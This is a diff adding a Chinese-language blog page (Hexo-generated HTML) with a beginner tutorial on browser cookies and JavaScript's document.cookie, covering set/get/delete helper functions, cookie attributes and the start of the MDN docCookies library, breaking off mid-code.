@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="jiuchengBlog 博客">
+    <meta name="description" content="hello, here is JiuCheng&#39; s blog">
+    <meta name="author" content="馨er">
+    
+    <title>
+        
+            cookie详解 |
+        
+        馨er的学习之路
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.png">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"jiucheng120.github.io","root":"/","language":"zh-CN","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":false},"style":{"primary_color":"#CC00FF","avatar":"/images/avatar.png","favicon":"/images/logo.png","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.png","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":true},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/avatar.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                馨er的学习之路
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class href="/">
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class href="/archives">
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class href="/categories">
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class href="/tags">
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class href="/links">
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class href="/about">
+                                关于
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/jiucheng120">
+                                GITHUB
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class href="/about">关于</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/jiucheng120">GITHUB</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">cookie详解</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">馨er</span>
+                        
+                            <span class="author-label">CTO</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-07-11 23:55:27</span>
+        <span class="mobile">2022-07-11 23:55</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%89%8D%E7%AB%AF/">前端</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/cookie/">cookie</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/vue/">vue</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.7k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>16 分钟</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <blockquote>
+<p>cookie详解</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="1-什么是Cookie"><a href="#1-什么是Cookie" class="headerlink" title="1 什么是Cookie"></a>1 什么是Cookie</h1><p>Cookie是一些数据，存储于你电脑上的文本文件中</p>
+<p>当 web 服务器向浏览器发送 web 页面时，在连接关闭后，服务端不会记录用户的信息。Cookie 的作用就是用于解决 “如何记录客户端的用户信息”:</p>
+<ul>
+<li>当用户访问 web 页面时，他的名字可以记录在 cookie 中。</li>
+<li>在用户下一次访问该页面时，可以在 cookie 中读取用户访问记录。</li>
+</ul>
+<p>Cookie 以名/值对形式存储，如下所示:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = John Doe</span><br></pre></td></tr></table></figure>
+
+<p>当浏览器从服务器上请求 web 页面时， 属于该页面的 cookie 会被添加到该请求中。服务端通过这种方式来获取用户的信息。</p>
+<blockquote>
+<p>应用：用户登录页面记住密码（本人也是从这里过来的）</p>
+</blockquote>
+<h1 id="2-使用JavaScript操作Cookie"><a href="#2-使用JavaScript操作Cookie" class="headerlink" title="2 使用JavaScript操作Cookie"></a>2 使用JavaScript操作Cookie</h1><h2 id="2-1-创建Cookie"><a href="#2-1-创建Cookie" class="headerlink" title="2.1 创建Cookie"></a>2.1 创建Cookie</h2><p>JavaScript可以使用document.cookie属性来创建、读取及删除cookie</p>
+<p>JavaScript中，创建cookie如下所示</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;username=John Doe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>您还可以为 cookie 添加一个过期时间（以 UTC 或 GMT 时间）。默认情况下，cookie 在浏览器关闭时删除：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie=<span class="string">&quot;username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>您可以使用 path 参数告诉浏览器 cookie 的路径。默认情况下，cookie 属于当前页面。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie=<span class="string">&quot;username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-2-使用JavaScript读取Cookie"><a href="#2-2-使用JavaScript读取Cookie" class="headerlink" title="2.2 使用JavaScript读取Cookie"></a>2.2 使用JavaScript读取Cookie</h2><p>在JavaScript中，可以使用以下代码读取cookie：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>document.cookie 将以字符串的方式返回所有的 cookie，类型格式： cookie1=value; cookie2=value; cookie3=value;</p>
+</blockquote>
+<h2 id="2-3-使用JavaScript修改Cookie"><a href="#2-3-使用JavaScript修改Cookie" class="headerlink" title="2.3 使用JavaScript修改Cookie"></a>2.3 使用JavaScript修改Cookie</h2><p>在JavaScript中，修改cookie类似于创建cookie，如下所示：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie=<span class="string">&quot;username=John Smith; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-4-使用JavaScript删除Cookie"><a href="#2-4-使用JavaScript删除Cookie" class="headerlink" title="2.4 使用JavaScript删除Cookie"></a>2.4 使用JavaScript删除Cookie</h2><p>删除 cookie 非常简单。只需要设置 expires 参数为以前的时间即可，如下所示，设置为 Thu, 01 Jan 1970 00:00:00 GMT:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = “username=; expires=Thu, <span class="number">01</span> Jan <span class="number">1970</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> GMT”;</span><br></pre></td></tr></table></figure>
+
+<p>注意，当删除时不必指定 cookie 的值。</p>
+<h1 id="3-Cookie字符串"><a href="#3-Cookie字符串" class="headerlink" title="3 Cookie字符串"></a>3 Cookie字符串</h1><p>document.cookie 属性看起来像一个普通的文本字符串，其实它不是。</p>
+<p>即使在 document.cookie 中写入一个完整的 cookie 字符串, 当重新读取该 cookie 信息时，cookie 信息是以名/值对的形式展示的。</p>
+<p>如果设置了新的 cookie，旧的 cookie 不会被覆盖。 新 cookie 将添加到 document.cookie 中，所以如果重新读取document.cookie，将获得如下所示的数据：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cookie1=value</span><br><span class="line">cookie2=value</span><br></pre></td></tr></table></figure>
+
+<p>如果需要查找一个指定 cookie 值，您必须创建一个JavaScript 函数在 cookie 字符串中查找 cookie 值。</p>
+<h1 id="4-JavaScript-Cookie实例"><a href="#4-JavaScript-Cookie实例" class="headerlink" title="4 JavaScript Cookie实例"></a>4 JavaScript Cookie实例</h1><p>在以下实例中，将创建 cookie 来存储访问者名称。</p>
+<p>首先，访问者访问 web 页面, 他将被要求填写自己的名字。该名字会存储在 cookie 中。</p>
+<p>访问者下一次访问页面时，他会看到一个欢迎的消息。</p>
+<p>在这个实例中我们会创建 3 个 JavaScript 函数:</p>
+<ul>
+<li>设置 cookie 值的函数</li>
+<li>获取 cookie 值的函数</li>
+<li>检测 cookie 值的函数</li>
+</ul>
+<h2 id="4-1-设置-cookie-值的函数"><a href="#4-1-设置-cookie-值的函数" class="headerlink" title="4.1 设置 cookie 值的函数"></a>4.1 设置 cookie 值的函数</h2><p>首先，我们创建一个函数用于存储访问者的名字：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">cname,cvalue,exdays</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">  d.setTime(d.getTime()+(exdays*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span>)); <span class="comment">// 时间为exdays天，因为getTIME得到的是以毫秒为单位的时间</span></span><br><span class="line">  <span class="keyword">let</span> expires = <span class="string">&quot;expires=&quot;</span>+d.toGMTString();</span><br><span class="line">  <span class="built_in">document</span>.cookie = cname + <span class="string">&quot;=&quot;</span> + cvalue + <span class="string">&quot;; &quot;</span> + expires;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>函数解析：</strong></p>
+<p>以上的函数参数中，cookie 的名称为 cname，cookie 的值为 cvalue，并设置了 cookie 的过期时间 expires。</p>
+<p>该函数设置了 cookie 名、cookie 值、cookie过期时间。</p>
+<h2 id="4-2-获取-cookie-值的函数"><a href="#4-2-获取-cookie-值的函数" class="headerlink" title="4.2 获取 cookie 值的函数"></a>4.2 获取 cookie 值的函数</h2><p>然后，我们创建一个函数用于返回指定 cookie 的值：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">cname</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> name = cname + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">  <span class="keyword">let</span> ca = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;ca.length; i++) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">let</span> c = ca[i].trim();</span><br><span class="line">    <span class="keyword">if</span> (c.indexOf(name)==<span class="number">0</span>) <span class="keyword">return</span> c.substring(name.length,c.length);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>函数解析：</strong><br>cookie 名的参数为 cname。创建一个文本变量用于检索指定 cookie :cname + “=”。</p>
+<p>使用分号来分割 document.cookie 字符串，并将分割后的字符串数组赋值给 ca (<code>ca = document.cookie.split(’;’)</code>)。循环 ca 数组 (i=0;i&lt;ca.length;i++)，然后读取数组中的每个值，并去除前后空格 (<code>c=ca[i].trim()</code>)。</p>
+<p>如果找到 <code>cookie(c.indexOf(name) == 0)</code>，返回 cookie 的值 (<code>c.substring(name.length,c.length</code>)。如果没有找到 cookie, 返回 “”。</p>
+<h2 id="4-3-检测-cookie-值的函数"><a href="#4-3-检测-cookie-值的函数" class="headerlink" title="4.3 检测 cookie 值的函数"></a>4.3 检测 cookie 值的函数</h2><p>最后，我们可以创建一个检测 cookie 是否创建的函数。</p>
+<p>如果设置了 cookie，将显示一个问候信息。</p>
+<p>如果没有设置 cookie，将会显示一个弹窗用于询问访问者的名字，并调用 setCookie 函数将访问者的名字存储 365 天：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> username=getCookie(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (username!=<span class="string">&quot;&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    alert(<span class="string">&quot;Welcome again &quot;</span> + username);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">  &#123;</span><br><span class="line">    username = prompt(<span class="string">&quot;Please enter your name:&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (username!=<span class="string">&quot;&quot;</span> &amp;&amp; username!=<span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      setCookie(<span class="string">&quot;username&quot;</span>,username,<span class="number">365</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-4-完整示例"><a href="#4-4-完整示例" class="headerlink" title="4.4 完整示例"></a>4.4 完整示例</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">cname,cvalue,exdays</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    d.setTime(d.getTime()+(exdays*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span>));</span><br><span class="line">    <span class="keyword">let</span> expires = <span class="string">&quot;expires=&quot;</span>+d.toGMTString();</span><br><span class="line">    <span class="built_in">document</span>.cookie = cname+<span class="string">&quot;=&quot;</span>+cvalue+<span class="string">&quot;; &quot;</span>+expires;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">cname</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> name = cname + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> ca = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;ca.length; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> c = ca[i].trim();</span><br><span class="line">        <span class="keyword">if</span> (c.indexOf(name)==<span class="number">0</span>) &#123; <span class="keyword">return</span> c.substring(name.length,c.length); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> user=getCookie(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (user!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        alert(<span class="string">&quot;欢迎 &quot;</span> + user + <span class="string">&quot; 再次访问&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        user = prompt(<span class="string">&quot;请输入你的名字:&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (user!=<span class="string">&quot;&quot;</span> &amp;&amp; user!=<span class="literal">null</span>)&#123;</span><br><span class="line">            setCookie(<span class="string">&quot;username&quot;</span>,user,<span class="number">30</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="5-Document-cookie使用文档-运行实例"><a href="#5-Document-cookie使用文档-运行实例" class="headerlink" title="5 Document.cookie使用文档+运行实例"></a>5 Document.cookie使用文档+运行实例</h1><p>获取并设置与当前文档相关联的 cookie。可以把它当成一个 getter and setter。</p>
+<h2 id="5-1-语法"><a href="#5-1-语法" class="headerlink" title="5.1 语法"></a>5.1 语法</h2><p>读取所有可从此位置访问的Cookie</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allCookies = <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
+
+<p>在上面的代码中，allCookies被赋值为一个字符串，该字符串包含所有的Cookie，每条cookie以”分号和空格(; )”分隔(即, key=value 键值对)</p>
+<p>写一个新 cookie：<code>document.cookie = newCookie</code></p>
+<p>newCookie是一个键值对形式的字符串。需要注意的是，用这个方法一次只能对一个cookie进行设置或更新</p>
+<p>以下可选的cookie属性值可以跟在键值对后，用来具体化对cookie的设定/更新，使用分号以作分隔：</p>
+<ul>
+<li><code>;path=path</code> (例如 ‘/’, ‘/mydir’) 如果没有定义，默认为当前文档位置的路径。</li>
+<li><code>;domain=domain</code> (例如 ‘example.com’， ‘subdomain.example.com’) 如果没有定义，默认为当前文档位置的路径的域名部分。与早期规范相反的是，在域名前面加 . 符将会被忽视，因为浏览器也许会拒绝设置这样的cookie。如果指定了一个域，那么子域也包含在内。</li>
+<li><code>;max-age=max-age-in-seconds</code> (例如一年为606024*365)</li>
+<li><code>;expires=date-in-GMTString-format</code> 如果没有定义，cookie会在对话结束时过期</li>
+<li><code>;secure</code> (cookie只通过https协议传输)</li>
+</ul>
+<p>cookie的值字符串可以用encodeURIComponent()来保证它不包含任何逗号、分号或空格(cookie值中禁止使用这些值).</p>
+<blockquote>
+<p>备注: 在Gecko 6.0前，被引号括起的路径的引号会被当做路径的一部分，而不是被当做定界符。现在已被修复。</p>
+</blockquote>
+<h2 id="5-2-示例"><a href="#5-2-示例" class="headerlink" title="5.2 示例"></a>5.2 示例</h2><h3 id="5-2-1-示例1：简单用法"><a href="#5-2-1-示例1：简单用法" class="headerlink" title="5.2.1 示例1：简单用法"></a>5.2.1 示例1：简单用法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;name=oeschger&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;favorite_food=tripe&quot;</span>;</span><br><span class="line">alert(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="comment">// 显示: name=oeschger; favorite_food=tripe</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-2-示例2：得到名为test2的cookie"><a href="#5-2-2-示例2：得到名为test2的cookie" class="headerlink" title="5.2.2 示例2：得到名为test2的cookie"></a>5.2.2 示例2：得到名为test2的cookie</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;test1=Hello&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;test2=World&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myCookie = <span class="built_in">document</span>.cookie.replace(<span class="regexp">/(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*$)|^.*$/</span>, <span class="string">&quot;$1&quot;</span>);</span><br><span class="line"></span><br><span class="line">alert(myCookie);</span><br><span class="line"><span class="comment">// 显示: World</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-3-示例3：只执行某事一次"><a href="#5-2-3-示例3：只执行某事一次" class="headerlink" title="5.2.3 示例3：只执行某事一次"></a>5.2.3 示例3：只执行某事一次</h3><p>要使下面的代码工作，请替换所有someCookieName (cookie的名字)为自定义的名字。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie.replace(<span class="regexp">/(?:(?:^|.*;\s*)someCookieName\s*\=\s*([^;]*).*$)|^.*$/</span>, <span class="string">&quot;$1&quot;</span>) !== <span class="string">&quot;true&quot;</span>) &#123;</span><br><span class="line">  alert(<span class="string">&quot;Do something here!&quot;</span>);</span><br><span class="line">  <span class="built_in">document</span>.cookie = <span class="string">&quot;someCookieName=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="6🍇一个小框架：一个完整支持unicode的cookie读取-写入器"><a href="#6🍇一个小框架：一个完整支持unicode的cookie读取-写入器" class="headerlink" title="6🍇一个小框架：一个完整支持unicode的cookie读取/写入器"></a>6🍇一个小框架：一个完整支持unicode的cookie读取/写入器</h1><p>作为一个格式化过的字符串，cookie的值有时很难被自然地处理。下面的库的目的是通过定义一个和Storage对象部分一致的对象（docCookies），简化document.cookie 的获取方法。它提供完全的Unicode支持。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*\</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  :: cookies.js ::</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  A complete cookies reader/writer framework with full unicode support.</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  https://developer.mozilla.org/en-US/docs/DOM/document.cookie</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  This framework is released under the GNU Public License, version 3 or later.</span></span><br><span class="line"><span class="comment">|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  Syntaxes:</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])</span></span><br><span class="line"><span class="comment">|*|  * docCookies.getItem(name)</span></span><br><span class="line"><span class="comment">|*|  * docCookies.removeItem(name[, path], domain)</span></span><br><span class="line"><span class="comment">|*|  * docCookies.hasItem(name)</span></span><br><span class="line"><span class="comment">|*|  * docCookies.keys()</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">\*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> docCookies = &#123;</span><br><span class="line">  getItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(<span class="built_in">document</span>.cookie.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;(?:(?:^|.*;)\\s*&quot;</span> + <span class="built_in">encodeURIComponent</span>(sKey).replace(<span class="regexp">/[-.+*]/g</span>, <span class="string">&quot;\\$&amp;&quot;</span>) + <span class="string">&quot;\\s*\\=\\s*([^;]*).*$)|^.*$&quot;</span>), <span class="string">&quot;$1&quot;</span>)) || <span class="literal">null</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  setItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey, sValue, vEnd, sPath, sDomain, bSecure</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!sKey || <span class="regexp">/^(?:expires|max\-age|path|domain|secure)$/i</span>.test(sKey)) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">    <span class="keyword">let</span> sExpires = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (vEnd) &#123;</span><br><span class="line">      <span class="keyword">switch</span> 